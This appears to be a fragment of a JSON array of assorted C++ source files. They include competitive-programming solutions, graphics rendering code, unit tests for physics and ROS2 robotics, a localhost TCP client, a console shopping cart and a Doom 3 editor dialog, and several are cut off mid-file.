          GLuint vShader = glCreateShader(GL_VERTEX_SHADER);\r\n            GLuint fShader = glCreateShader(GL_FRAGMENT_SHADER);\r\n            glShaderSource(vShader, 1, const_cast<const GLchar**>(&vSrc), nullptr);\r\n            glShaderSource(fShader, 1, const_cast<const GLchar**>(&fSrc), nullptr);\r\n            glCompileShader(vShader);\r\n            glCompileShader(fShader);\r\n            \r\n            char info[1024];\r\n            GLint vSuc, fSuc, pSuc;\r\n            glGetShaderiv(vSh",
    "#include <bits/stdc++.h>\n#define MASK(i) (1LL << (i))\n#define all(x) x.begin(), x.end()\n#define setpr(x) cout << setprecision(x) << fixed\n#define fastbuild ios::sync_with_stdio(false); cin.tie(0);\n#define whatIs(x) cerr << \"Line \" << __LINE__ << \": \" << #x << \" = \" << (x) << endl\n\ntypedef long long ll;\nusing namespace std;\n\n\n/*\n    Link bai: https://codeforces.com/contest/1978/problem/B\n    H\u00e0m l\u1ee3i nhu\u1eadn f(k) = (n-k)*a - (k*(k-1) / 2)\n    \u0111\u00e2y l\u00e0 h\u00e0m b\u1eadc 2, n\u00f3 s\u1ebd t\u0103ng t\u00f3i ng\u01b0\u1ee1n k n\u00e0o \u0111\u1ed1 r\u1ed3i s\u1ebd gi\u1ea3m\n*/\nll f(ll n, ll a, ll b, ll k)\n{\n    ll price = 1ll*(n-k)*a;\n    ll Price_sell = 1ll*k*b - 1ll*(k*(k-1))/2;\n    return  price + Price_sell;\n}\n\nsigned main() \n{\n    fastbuild\n    ll t; cin >> t;\n    while (t--) \n    {\n        ll n, a, b;\n        cin >> n >> a >> b;\n        ll lo = 0;\n        ll hi = min(n, b);\n        ll Max = 0;\n        while(lo <= hi)\n        {\n            ll u = (lo*2 + hi) / 3;\n            ll v = (lo + hi*2) / 3;\n            ll profit1 = f(n, a, b, u);\n            ll profit2 = f(n, a, b, v);\n            if(profit1 > profit2)\n            {\n                Max = max(Max, profit1);\n                hi = v - 1;\n            }\n            else\n            {\n                Max = max(Max, profit2);\n                lo = u + 1;\n            }\n        }\n        cout << Max << endl;\n    }\n    return 0;\n}\n",
    "#include \"../src/utils.h\"\n#include \"../src/geometry.h\"\n#include \"../src/interfaces.h\"\n#include \"../src/vhlle_fcell.h\"\n#include \"../src/I_engine.h\"\n#include \"../src/yield_calculator.h\"\n#include \"../src/pdg_particle.h\"\n#include \"my_test.h\"\n#include \"../src/vhll_engine_helper.h\"\nnamespace\n{\n    namespace ug = utils::geometry;\n    class VHLLE_EngineTest : public my_test\n    {\n    protected:\n        vhlle::engine_helper engine;\n        utils::program_options opts;\n        VHLLE_EngineTest()\n        {\n            opts.accept_mode = utils::accept_modes::AcceptAll;\n            opts.program_mode = utils::program_modes::Yield;\n            opts.yield_mode = utils::yield_modes::GlobalEq;\n            opts.polarization_mode = utils::polarization_modes::NA;\n            opts.in_file = \"./input/beta-60.dat\";\n            opts.out_file = \"./output/yield_sample.dat\";\n        }\n        void SetUp() override\n        {\n            engine = vhlle::engine_helper(opts);\n            engine.configure();\n        }\n        void TearDown() override\n        {\n        }\n    };\n\n    TEST_F(VHLLE_EngineTest, TestParticles)\n    {\n        auto pion = std::make_unique<powerhouse::pdg_particle>(powerhouse::particle_names::PION_PLUS);\n\n        EXPECT_DOUBLE_EQ(pion->mass(), 0.13957039);\n        EXPECT_EQ(pion->name(), \"pi\");\n        EXPECT_EQ(pion->pdg_id(), 211);\n        EXPECT_DOUBLE_EQ(pion->Q(), 1);\n        EXPECT_DOUBLE_EQ(pion->B(), 0);\n        EXPECT_DOUBLE_EQ(pion->S(), 0);\n        ASSERT_TRUE(pion->isparticle());\n        EXPECT_DOUBLE_EQ(pion->spin(), 0);\n        EXPECT_EQ(pion->statistics(), powerhouse::BOSON);\n\n        int id = powerhouse::particle_names::PION_MINUS;\n        auto apion = std::make_unique<powerhouse::pdg_particle>(id);\n\n        EXPECT_DOUBLE_EQ(apion->mass(), 0.13957039);\n        EXPECT_EQ(apion->name(), \"anti-pi\");\n        EXPECT_EQ(apion->pdg_id(), 211);\n        EXPECT_DOUBLE_EQ(apion->Q(), -1);\n        EXPECT_DOUBLE_EQ(apion->B(), 0);\n        ASSERT_FALSE(apion->isparticle());\n        EXPECT_DOUBLE_EQ(apion->spin(), 0);\n        EXPECT_EQ(apion->statistics(), powerhouse::BOSON);\n\n        auto lambda = std::make_unique<powerhouse::pdg_particle>(powerhouse::particle_names::LAMBDA);\n        EXPECT_DOUBLE_EQ(lambda->mass(), 1.115683);\n        EXPECT_EQ(lambda->name(), \"Lambda\");\n        EXPECT_EQ(lambda->pdg_id(), 3122);\n        EXPECT_DOUBLE_EQ(lambda->Q(), 0);\n        EXPECT_DOUBLE_EQ(lambda->B(), 1);\n        EXPECT_DOUBLE_EQ(lambda->S(), -1);\n        ASSERT_TRUE(lambda->isparticle());\n        EXPECT_DOUBLE_EQ(lambda->spin(), 0.5);\n        EXPECT_EQ(lambda->statistics(), 1);\n\n        auto alambda = std::make_unique<powerhouse::pdg_particle>(powerhouse::particle_names::LAMBDA_BAR);\n        EXPECT_DOUBLE_EQ(alambda->mass(), 1.115683);\n        EXPECT_EQ(alambda->name(), \"anti-Lambda\");\n        EXPECT_EQ(alambda->pdg_id(), 3122);\n        EXPECT_DOUBLE_EQ(alambda->Q(), 0);\n        EXPECT_DOUBLE_EQ(alambda->B(), -1);\n        EXPECT_DOUBLE_EQ(alambda->S(), 1);\n        ASSERT_FALSE(alambda->isparticle());\n        EXPECT_DOUBLE_EQ(alambda->spin(), 0.5);\n        EXPECT_EQ(alambda->statistics(), 1);\n    }\n\n    TEST_F(VHLLE_EngineTest, TestIfYieldWorks)\n    {\n        vhlle::surface surface;\n        surface.read(opts.in_file, opts.accept_mode, 100);\n        opts.particle_id = powerhouse::particle_names::PION_PLUS;\n        EXPECT_EQ(surface.total(), surface.data().size());\n        EXPECT_NO_THROW(engine.init(surface));\n        engine.run();\n        auto &&output = engine.yield_output();\n        // for (auto &&row : output)\n        // {\n        //     // ASSERT_TRUE(row.dNd3p >=0) << \"at (\" << row.pT << \",\" << row.phi_p <<\n        //     // \",\" << row.y_p << \") dN/d3p = \" << row.dNd3p;\n        //     std::cout << \"at (\" << row.pT << \",\" << row.phi_p <<\n        //     \",\" << row.y_p << \") dN/d3p = \" << row.local_yield() << std::endl;\n        // }\n\n        std::cout << \"Writing the output ...\" << std::endl;\n        engine.write();\n\n        std::cout << std::endl;\n    }\n\n    // TEST_F(YieldTest, TestIfResultsAreUnique)\n    // {\n    //     int lines;\n    //     auto surface = read_cells<vhlle::fcell>(opts.in_file, 100, lines);\n    //     opts.particle_id = powerhouse::particle_names::PION_PLUS;\n    //     EXPECT_EQ(surface.total(), surface.data().size());\n    //     EXPECT_NO_THROW(engine->init(opts, surface));\n    //     engine->run();\n    //     const auto& output = engine->yield_output();\n    //     for (auto &&row : output)\n    //     {\n    //         auto count = std::count_if(output.begin(), output.end(), [&row](const powerhouse::yield_output<vhlle::fcell>& yo)\n    //         {\n    //             return row.phi_p == yo.phi_p && row.pT == yo.pT && row.y_p == yo.y_p;\n    //         });\n    //         ASSERT_TRUE(count == 1) << \"at (\" << row.pT << \",\" << row.phi_p <<\n    //         \",\" << row.y_p << \") there are \" << count << \" rows\";\n\n    //     }\n    //     engine->write();\n    // }\n}",
    "#include <milg/audio.hpp>\n#include <milg/graphics.hpp>\n#include <milg/graphics/map.hpp>\n#include <milg/graphics/sprite_batch.hpp>\n#include <milg/graphics/texture.hpp>\n#include <milg/milg.hpp>\n\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n#include <glm/gtc/random.hpp>\n\n#include <cstdint>\n\nusing namespace milg;\nusing namespace milg::graphics;\n\nclass GraphicsLayer : public Layer {\npublic:\n    std::shared_ptr<VulkanContext> context = nullptr;\n    // This will hold whatever we render in the layer\n    std::shared_ptr<Texture> framebuffer = nullptr;\n    // Some random texture to draw\n    std::shared_ptr<Texture>     test_texture = nullptr;\n    std::shared_ptr<SpriteBatch> sprite_batch = nullptr;\n    std::unique_ptr<Map>         map;\n    std::vector<Tile>            tiles;\n\n    void on_attach() override {\n        MILG_INFO(\"Initializing Graphics layer\");\n\n        context      = Application::get().context();\n        auto &window = Application::get().window();\n\n        TextureCreateInfo texture_info = {\n            .format     = VK_FORMAT_R8G8B8A8_UNORM,\n            .usage      = VK_IMAGE_USAGE_SAMPLED_BIT,\n            .min_filter = VK_FILTER_NEAREST,\n            .mag_filter = VK_FILTER_NEAREST,\n        };\n\n        auto map_data = asset_store::get_asset(\"map_desert\");\n        this->map     = std::make_unique<Map>(map_data->get_preprocessed<nlohmann::json>());\n        auto layer    = this->map->get_layer(1);\n        this->tiles   = layer->get_tiles();\n\n        auto tileset = this->map->get_tileset_for_gid(1);\n\n        {\n            auto data          = asset_store::get_asset(tileset->get_source().string());\n            this->test_texture = Texture::load_from_data(context, texture_info, data->get_data(), data->get_size());\n        }\n\n        this->framebuffer =\n            Texture::create(context,\n                            {.format = VK_FORMAT_R8G8B8A8_UNORM,\n                             .usage  = VK_IMAGE_USAGE_TRANSFER_SRC_BIT | VK_IMAGE_USAGE_COLOR_ATTACHMENT_BIT},\n                            window->width(), window->height());\n\n        // Capacity here is the maximum amount of sprites that can be drawn in one frame, more number\n        // allocates more memory, but it's not that much to begin with\n        this->sprite_batch = SpriteBatch::create(context, framebuffer->format(), 10000);\n    }\n\n    void on_update(float delta) override {\n        // Acquire a command buffer from the application, it will be automatically submitted and disposed at the end of\n        // the frame\n        auto command_buffer = Application::get().acquire_command_buffer();\n\n        const VkCommandBufferBeginInfo command_buffer_begin_info = {\n            .sType            = VK_STRUCTURE_TYPE_COMMAND_BUFFER_BEGIN_INFO,\n            .pNext            = nullptr,\n            .flags            = VK_COMMAND_BUFFER_USAGE_ONE_TIME_SUBMIT_BIT,\n            .pInheritanceInfo = nullptr,\n        };\n\n        // Begin recording the command buffer and transition the framebuffer to a layout we can render to\n        context->device_table().vkBeginCommandBuffer(command_buffer, &command_buffer_begin_info);\n        framebuffer->transition_layout(command_buffer, VK_IMAGE_LAYOUT_COLOR_ATTACHMENT_OPTIMAL);\n\n        // Construct an orthographic projection matrix that is the size of the framebuffer and the center is at (0, 0)\n        float     half_width  = framebuffer->width() * 0.5f;\n        float     half_height = framebuffer->height() * 0.5f;\n        glm::mat4 mat         = glm::ortho(-half_width, half_width, -half_height, half_height, -1.0f, 1.0f);\n\n        // Move the center of the projection matrix to the top left corner\n        mat = glm::translate(mat, {-half_width, -half_height, 0.0f});\n\n        // Reset the sprite batch, should be done once at the beginning of the frame\n        sprite_batch->reset();\n        sprite_batch->begin_batch(mat);\n\n        for (auto &tile : this->tiles) {\n            sprite_batch->draw_sprite(tile.sprite, test_texture);\n        }\n\n        // After drawing, build_batches should be called, this copies over data to the appropriate buffers\n        sprite_batch->build_batches(command_buffer);\n\n        // Prepare some Vulkan structs for rendering, only clearValue might be interesting here\n        // as this will be the color the screen is cleared with\n        const VkExtent2D extent   = {framebuffer->width(), framebuffer->height()};\n        const VkRect2D   scissor  = {{0, 0}, extent};\n        const VkViewport viewport = {\n            .x        = 0.0f,\n            .y        = 0.0f,\n            .width    = (float)extent.width,\n            .height   = (float)extent.height,\n            .minDepth = 0.0f,\n            .maxDepth = 1.0f,\n        };\n        const std::array<VkRenderingAttachmentInfo, 1> rendering_attachment_infos = {\n            VkRenderingAttachmentInfo{\n                .sType              = VK_STRUCTURE_TYPE_RENDERING_ATTACHMENT_INFO,\n                .pNext              = nullptr,\n                .imageView   ",
    "#include <iostream>\n#include <string>\n#include <cstring>\n#include <unistd.h>\n#include <arpa/inet.h>\n\nint main() {\n    int sock = 0;\n    struct sockaddr_in serv_addr;\n    std::string message = \"Hello, server\";\n    char buffer[1024] = {0};\n\n    // \u521b\u5efasocket\u6587\u4ef6\u63cf\u8ff0\u7b26\n    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {\n        std::cerr << \"Socket creation error\" << std::endl;\n        return -1;\n    }\n\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_port = htons(8080);\n\n    // \u5c06IP\u5730\u5740\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u683c\u5f0f\n    if (inet_pton(AF_INET, \"127.0.0.1\", &serv_addr.sin_addr) <= 0) {\n        std::cerr << \"Invalid address/ Address not supported\" << std::endl;\n        return -1;\n    }\n\n    // \u8fde\u63a5\u670d\u52a1\u5668\n    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {\n        std::cerr << \"Connection failed\" << std::endl;\n        return -1;\n    }\n\n    send(sock, message.c_str(), message.length(), 0);\n    read(sock, buffer, 1024);\n    std::cout << \"Server response: \" << buffer << std::endl;\n\n    close(sock);\n    return 0;\n}\n",
    "#include \"geometry_msgs/msg/point.hpp\"\n#include \"geometry_msgs/msg/twist.hpp\"\n#include \"nav_msgs/msg/odometry.hpp\"\n#include \"rclcpp/executors.hpp\"\n#include \"rclcpp/rclcpp.hpp\"\n#include \"rclcpp_action/rclcpp_action.hpp\"\n#include \"std_srvs/srv/empty.hpp\"\n#include \"tf2/LinearMath/Quaternion.h\"\n#include \"tf2/utils.h\"\n#include \"tortoisebot_waypoints/action/waypoint_action.hpp\"\n#include \"gtest/gtest.h\"\n#include <memory>\n\nusing std::placeholders::_1;\nusing std::placeholders::_2;\nusing namespace std::chrono_literals;\nusing std_srvs::srv::Empty;\n\nclass TestSetup {\npublic:\n  TestSetup() { rclcpp::init(0, nullptr); }\n};\n\nclass WaypointTesting : public ::testing::Test {\npublic:\n  using WaypointTestAction = tortoisebot_waypoints::action::WaypointAction;\n  using GoalHandleTest = rclcpp_action::ClientGoalHandle<WaypointTestAction>;\n\n  WaypointTesting() {\n\n    test_node = rclcpp::Node::make_shared(\"test_node\");\n    odom_subscription = test_node->create_subscription<nav_msgs::msg::Odometry>(\n        \"/odom\", 10, std::bind(&WaypointTesting::odom_data_callback, this, _1));\n\n    action_test_client = rclcpp_action::create_client<WaypointTestAction>(\n        test_node, \"tortoisebot_as\");\n\n    srv_client_ = test_node->create_client<Empty>(\"/reset_world\");\n\n    this->goal_point.x = 1.0; // Enter -1.0 for test to fail\n    this->goal_point.y = 1.0; // Enter -1.0 for test to fail\n    this->goal_point.z = 1.57;\n\n    if (!action_test_client->wait_for_action_server(10s)) {\n      RCLCPP_ERROR(test_node->get_logger(), \"Action server not available\");\n    }\n\n    auto goal_msg = WaypointTestAction::Goal();\n    // reset_world();\n\n    goal_msg.position = this->goal_point;\n    auto goal_options =\n        rclcpp_action::Client<WaypointTestAction>::SendGoalOptions();\n    goal_options.goal_response_callback =\n        std::bind(&WaypointTesting::goal_response_handler, this, _1);\n    goal_options.feedback_callback =\n        std::bind(&WaypointTesting::feedback_handler, this, _1, _2);\n    goal_options.result_callback =\n        std::bind(&WaypointTesting::result_handler, this, _1);\n    auto future = action_test_client->async_send_goal(goal_msg, goal_options);\n  }\n\n  bool CheckPositionValidity() {\n    while (is_test_active) {\n      rclcpp::spin_some(test_node);\n    }\n\n    float x_error = abs(goal_point.x - current_point.x);\n    float y_error = abs(goal_point.y - current_point.y);\n    float linear_error = std::sqrt(std::pow(x_error, 2) + std::pow(y_error, 2));\n    std::cout << linear_error << std::endl << std::flush;\n    if (linear_error < 0.2) {\n      return true;\n    }\n\n    return false;\n  }\n\n  bool CheckAngleValidity() {\n    while (is_test_active) {\n      rclcpp::spin_some(test_node);\n    }\n\n    float yaw_error = abs(goal_point.z - current_yaw);\n    std::cout << yaw_error << std::endl << std::flush;\n    if (yaw_error <= 0.5) {\n      return true;\n    }\n\n    return false;\n  }\n\nprivate:\n  std::shared_ptr<rclcpp::Node> test_node;\n\n  void\n  goal_response_handler(std::shared_future<GoalHandleTest::SharedPtr> future) {\n    auto goal_handle = future.get();\n    if (!goal_handle) {\n      RCLCPP_ERROR(test_node->get_logger(), \"Goal rejected!\");\n    } else {\n      RCLCPP_INFO(test_node->get_logger(), \"Goal accepted!\");\n    }\n  }\n\n  void feedback_handler(\n      GoalHandleTest::SharedPtr,\n      const std::shared_ptr<const WaypointTestAction::Feedback> feedback) {}\n\n  void result_handler(const GoalHandleTest::WrappedResult &result) {\n    is_test_active = false;\n  }\n\n  void odom_data_callback(const nav_msgs::msg::Odometry::SharedPtr msg) {\n    current_point = msg->pose.pose.position;\n    tf2::Quaternion current_angle;\n    tf2::convert(msg->pose.pose.orientation, current_angle);\n    current_yaw = tf2::getYaw(current_angle);\n  }\n\n  void reset_world() {\n    std::cout << \"RESet...\" << std::endl;\n    auto request = std::make_shared<Empty::Request>();\n    auto result_future = srv_client_->async_send_request(request);\n    // std::this_thread::sleep_for(std::chrono::seconds(5));\n    auto timeout = std::chrono::seconds(10);\n    auto result =\n        rclcpp::spin_until_future_complete(test_node, result_future, timeout);\n\n    if (result != rclcpp::FutureReturnCode::SUCCESS) {\n      RCLCPP_ERROR(test_node->get_logger(),\n                   \"Failed to call /reset_world service within the timeout\");\n    }\n    // else {\n    // Reset current_point and current_yaw to zero\n    //   current_point.x = 0.0;\n    //   current_point.y = 0.0;\n    //   current_point.z = 0.0;\n    //   current_yaw = 0.0;\n    // }\n  }\n\n  float goal_yaw = 0.0;\n  bool is_test_active = true;\n  bool is_setup_performed = false;\n  rclcpp::Subscription<nav_msgs::msg::Odometry>::SharedPtr odom_subscription;\n  geometry_msgs::msg::Point goal_point;\n  geometry_msgs::msg::Point current_point;\n  float current_yaw;\n  rclcpp_action::Client<WaypointTestAction>::SharedPtr action_test_client;\n  rclcpp::TimerBase::SharedPtr test_timer;\n  rclcpp::Client<Empty>::SharedPtr srv_client_;\n};\n\nTestSetup global_test_setup;\n\nTEST_F(Waypoin",
    "#include \"solution.hpp\"\n#include \"solutionOne.hpp\"\n#include \"solutionTwo.hpp\"\n#include \"solutionThree.hpp\"\n#include \"solutionFour.hpp\"\n\nusing namespace std;\n\nint main(){\n\n\tSolution solution;\n\tvector<string> names={\"Mary\",\"John\",\"Emma\"};\n\tvector<int> heights={180,165,170};\n\tvector<string> firstOutput=solution.sortPeople(names,heights);\n\tcout<<\"ANSWER ONE= \"<<endl;\n\tfor(int i=0; i<firstOutput.size(); i++){\n\t\tcout<<firstOutput[i]<<endl;\n\t}\n\n\tSolutionOne solution1;\n\tstring key=\"the quick brown fox jumps over the lazy dog\";\n\tstring message=\"vkbs bs t suepuv\";\n\tstring OneOutput=solution1.decodeMessage(key,message);\n\tcout<<\"ANSWER TWO= \"<<OneOutput<<endl;\n\n\tSolutionTwo solution2;\n\tvector<int> nums={4,5,6,7,8,9};\n\tint diff=2;\n\tint outputTwo=solution2.arithmeticTriples(nums, diff);\n\tcout<<\"ANSWER THREE= \"<<outputTwo<<endl;\n\n\tSolutionThree solution3;\n\tvector<int> numsTwo={1,2,2,1};\n\tint k=1;\n\tint outputThree=solution3.countKDifference(numsTwo, k);\n\tcout<<\"ANSWER FOUR= \"<<outputThree<<endl;\n\n\tvector<string> operations = {\"OrderedStream\", \"insert\", \"insert\", \"insert\", \"insert\", \"insert\"};\n    vector<vector<string>> values = {{ \"5\" }, { \"3\", \"ccccc\" }, { \"1\", \"aaaaa\" }, { \"2\", \"bbbbb\" }, { \"5\", \"eeeee\" }, { \"4\", \"ddddd\" }};\n    Orderedstream* os=nullptr;\n    vector<vector<string>> output;\n\n    //IMPORTANTE!!!!!!!!!!!!!!!!!!!!!!!!!!!\n    for(int i=0; i<operations.size(); ++i){\n    \tif(operations[i]==\"Orderedstream\"){\n    \t\tint n=stoi(values[i][0]);\n    \t\tos=new Orderedstream(n);\n    \t\toutput.push_back({\"null\"});\n    \t}else if(operations[i]==\"insert\"){\n    \t\tint idKey=stoi(values[i][0]);\n    \t\tstring value=values[i][1]; //nueva forma de mapear sin unordered_map\n    \t\tvector<string> result=os->insert(idKey,value); //primer elemento, segundo elemento\n    \t\toutput.push_back(result);\n    \t}\n    }\n\n    cout<<\"[\";\n    for(int i=0; i<output.size(); ++i){\n    \tcout<<\"[\";\n    \tfor(int j=0; j<output[i].size(); ++j){\n    \t\tcout<<\"\\\"\"<<output[i][j]<<\"\\\"\";\n    \t\tif(j<output[i].size()-1){\n    \t\t\tcout<<\", \";\n    \t\t}\n    \t}\n    \tcout<<\"]\";\n    \tif(i<output.size()-1){\n    \t\tcout<<\", \";\n    \t}\n    }\n    cout<<\"]\"<<endl;\n\n    delete os; //liberar memoria\n\n\treturn 0;\n}\n",
    "#include<bits/stdc++.h>\n#define int long long \n\nusing namespace std;\n\nvector<vector<int>> v;\nvector<bool> visited;\nvector<int> connection;\t\n\nsigned main(){\n\tint n,m;\n\tcin>>n>>m;\n\tv.resize(n);\n\tvisited.resize(n,false);\n\tconnection.resize(n);\n\tfor(int i = 0 ; i < m ; ++i){\n\t\tint k;\n\t\tcin>>k;\n\t\tvector<int> p(k);\n\t\tfor(int j = 0 ; j < k ; ++j){\n\t\t\tcin>>p[j];\n            --p[j];\n\t\t}\n\t\tfor(int l = 0 ; l < k -1 ; ++l){\n\t\t\tv[p[l]].push_back(p[l+1]);\n\t\t\tv[p[l+1]].push_back(p[l]);\n\t\t}\n\t}\n\tfor(int i = 0 ; i < n ; ++i){\n\t\tif(!visited[i]){\n\t\t\tvector<int> components;\n            queue<int> q;\n            q.push(i);\n            visited[i] = true;\n            while(!q.empty()){\n                int currentvertex = q.front();\n                q.pop();\n                components.push_back(currentvertex);\n                for(auto i : v[currentvertex]){\n                    if(!visited[i]){\n                        q.push(i);\n                        visited[i] = true;\n                    }\n                }\n            }\n            for(auto i : components){\n                connection[i] = components.size();\n            }\n\t\t}\n\t}\n    for (int i = 0; i < n; ++i) {\n        cout << connection[i] << \" \";\n    }\n    cout << endl;\n\treturn 0;\n}\n\t",
    "#include <iostream>\n#include <map>\n#include <vector>\n\nusing namespace std;\n\nstruct Item {\n    string name;\n    double price;\n};\n\nvoid displayCart(const map<string, pair<double, int>>& cart) {\n    cout << \"\\nYour Shopping Cart:\\n\";\n    for (const auto& pair : cart) {\n        cout << pair.first << \" (Quantity: \" << pair.second.second << \") - $\" << pair.second.first << endl;\n    }\n}\n\nint main() {\n    cout<<\"_________________________WELCOME TO SQUARE-SPACE TERMINAL INTERFACE_______________________\";\n    string customerName;\n    map<string, vector<Item>> categories;\n    map<string, pair<double, int>> shoppingCart; // Pair of total price and quantity\n\n    // Existing categories and items\n    categories[\"Electronics\"] = {\n        {\"Laptop\", 800.0},\n        {\"Smartphone\", 500.0},\n        {\"Headphones\", 50.0},\n        {\"Tablet\", 300.0}\n    };\n\n    categories[\"Apparel\"] = {\n        {\"T-Shirt\", 20.0},\n        {\"Jeans\", 40.0},\n        {\"Dress\", 60.0},\n        {\"Jacket\", 70.0}\n    };\n\n    categories[\"Footwear\"] = {\n        {\"Sneakers\", 50.0},\n        {\"Boots\", 80.0},\n        {\"Sandals\", 30.0},\n        {\"Slippers\", 15.0}\n    };\n\n    categories[\"Consumables\"] = {\n        {\"Toothpaste\", 5.0},\n        {\"Shampoo\", 8.0},\n        {\"Soap\", 2.0},\n        {\"Snacks\", 3.0}\n    };\n\n    categories[\"Home Decor\"] = {\n        {\"Vase\", 25.0},\n        {\"Curtains\", 35.0},\n        {\"Rug\", 45.0},\n        {\"Clock\", 15.0}\n    };\n\n    categories[\"Toy\"] = {\n        {\"Action Figure\", 10.0},\n        {\"Board Game\", 20.0},\n        {\"Doll\", 15.0},\n        {\"Remote Control Car\", 30.0}\n    };\n\n    categories[\"Jewellery\"] = {\n        {\"Necklace\", 50.0},\n        {\"Earrings\", 40.0},\n        {\"Bracelet\", 35.0},\n        {\"Ring\", 45.0}\n    };\n\n    categories[\"Books\"] = {\n        {\"Fiction\", 12.0},\n        {\"Non-Fiction\", 14.0},\n        {\"Science\", 18.0},\n        {\"History\", 16.0}\n    };\n\n    categories[\"Health\"] = {\n        {\"Vitamins\", 10.0},\n        {\"Supplements\", 15.0},\n        {\"First Aid Kit\", 20.0},\n        {\"Thermometer\", 8.0}\n    };\n\n    categories[\"Personal Care & Beauty\"] = {\n        {\"Shampoo\", 8.0},\n        {\"Toothpaste\", 5.0},\n        {\"Lotion\", 12.0},\n        {\"Makeup Kit\", 25.0}\n    };\n    cout << \"\\n\\nEnter your name: \";\n    getline(cin, customerName);\n\n    while (true) {\n        cout << \"\\nOptions:\\n\";\n        cout << \"1. Display Cart\\n2. Add to Cart\\n3. Delete From Cart\\n0. Confirm Order\\n\";\n        cout << \"Enter your choice: \";\n        int choice;\n        cin >> choice;\n        cin.ignore();\n\n        if (choice == 0) {\n            break;\n        }\n\n        switch (choice) {\n            case 1:\n                displayCart(shoppingCart);\n                break;\n            case 2: {\n                // Add to Cart\n                cout << \"\\nCategories:\\n\";\n                cout << \"1. Electronics\\n2. Apparel\\n3. Footwear\\n4. Consumables\\n5. Home Decor\\n\";\n                cout << \"6. Toy\\n7. Jewellery\\n8. Books\\n9. Health\\n10. Personal Care & Beauty\\n\";\n                cout << \"\\nEnter your choice (0 to go back to options): \";\n                int categoryChoice;\n                cin >> categoryChoice;\n                cin.ignore();\n\n                if (categoryChoice < 1 || categoryChoice > 10) {\n                    break;\n                }\n\n                string category;\n                switch (categoryChoice) {\n                    case 1: category = \"Electronics\"; break;\n                    case 2: category = \"Apparel\"; break;\n                    case 3: category = \"Footwear\"; break;\n                    case 4: category = \"Consumables\"; break;\n                    case 5: category = \"Home Decor\"; break;\n                    case 6: category = \"Toy\"; break;\n                    case 7: category = \"Jewellery\"; break;\n                    case 8: category = \"Books\"; break;\n                    case 9: category = \"Health\"; break;\n                    case 10: category = \"Personal Care & Beauty\"; break;\n                }\n\n                while (true) {\n                    cout << \"\\nAvailable items in \" << category << \":\\n\";\n                    vector<Item> items = categories[category];\n                    for (int i = 0; i < items.size(); ++i) {\n                        cout << i + 1 << \". \" << items[i].name << \" - $\" << items[i].price << endl;\n                    }\n\n                    cout << \"\\nEnter item number to add to cart (0 to go back to categories): \";\n                    int itemNumber;\n                    cin >> itemNumber;\n                    cin.ignore();\n\n                    if (itemNumber < 1 || itemNumber > items.size()) {\n                        break;\n                    }\n\n                    Item chosenItem = items[itemNumber - 1];\n\n                    cout << \"\\nEnter quantity for this item: \";\n                    int quantity;\n                    cin >> quantity;\n                    cin.ignore();\n\n                    shoppingCart[chosenItem.name].first += chosenItem.price * quantity; // Update total price\n                    shop",
    "#include \"linalg/linalg.h\"\n#include <cstddef>\n#include <strstream>\n\nMatrix2D::Matrix2D(int rows, int columns) : rows(rows), columns(columns), data(rows * columns, 0.0) {}\n\nMatrix2D::Matrix2D(std::initializer_list<std::initializer_list<scalar_t>> list) : rows(list.size()), columns(list.begin()->size()), data(rows * columns) {\n    for (auto row : list) {\n        for (auto val : row) {\n            data.push_back(val);\n        }\n    }\n}\n\nscalar_t Matrix2D::at(int row, int column) const {\n    assert_bounds(row, column);\n    return data.at(row * this->columns + column);\n}\n\nscalar_t& Matrix2D::at(int row, int column) {\n    assert_bounds(row, column);\n    return data.at(row * this->columns + column);\n}\n\nvoid Matrix2D::assert_bounds(int m, int n) const {\n    if (m >= rows || m < 0 || n >= columns || n < 0) {\n        std::ostrstream ss;\n\n        ss << \"bad index (\" << m << \", \" << n << \n            \") for matrix of shape (\" << rows << \", \" << columns << \").\";\n\n        throw MatrixException(ss.str());\n    }\n}\n\nMatrix2D Matrix2D::operator+(const Matrix2D& other) const {\n    Matrix2D res_mat(rows, columns);\n\n    if (rows != other.rows || columns != other.columns) {\n        std::ostrstream ss;\n        \n        ss << \"matrix addition is undefined for shapes (\" << rows << \", \" << columns \n            << \") and (\" << other.rows << \", \" << other.columns << \")\";\n\n        throw MatrixException(ss.str());\n    }\n\n    for (size_t i = 0 ; i < data.size() ; i++) {\n        res_mat.data.at(i) = data.at(i) + other.data.at(i);\n    }\n\n    return res_mat;\n}\n\n// Matrix2D Matrix2D::operator*(const Matrix2D& other) const {\n// }\n",
    "/*\n===========================================================================\n\nDoom 3 GPL Source Code\nCopyright (C) 1999-2011 id Software LLC, a ZeniMax Media company.\n\nThis file is part of the Doom 3 GPL Source Code (\"Doom 3 Source Code\").\n\nDoom 3 Source Code is free software: you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nDoom 3 Source Code is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with Doom 3 Source Code.  If not, see <http://www.gnu.org/licenses/>.\n\nIn addition, the Doom 3 Source Code is also subject to certain additional terms. You should have received a copy of these additional terms immediately following the terms and conditions of the GNU General Public License which accompanied the Doom 3 Source Code.  If not, please request a copy in writing from id Software at the address below.\n\nIf you have questions concerning this license or the applicable additional terms, you may contact in writing id Software LLC, c/o ZeniMax Media Inc., Suite 120, Rockville, Maryland 20850 USA.\n\n===========================================================================\n*/\n\n#include \"precompiled.h\"\n#pragma hdrstop\n\n\n#include \"../../sys/win32/rc/resource.h\"\n\n#include \"DialogAF.h\"\n#include \"DialogAFConstraint.h\"\n#include \"DialogAFConstraintHinge.h\"\n\n\n// DialogAFConstraintHinge dialog\n\ntoolTip_t DialogAFConstraintHinge::toolTips[] = {\n\t{ IDC_RADIO_ANCHOR_JOINT, \"use the position of a joint for the anchor\" },\n\t{ IDC_COMBO_ANCHOR_JOINT, \"anchor joint name\" },\n\t{ IDC_RADIO_ANCHOR_COORDINATES, \"use absolute coordinates for the anchor\" },\n\t{ IDC_EDIT_ANCHOR_X, \"anchor x-coordinate\" },\n\t{ IDC_EDIT_ANCHOR_Y, \"anchor y-coordinate\" },\n\t{ 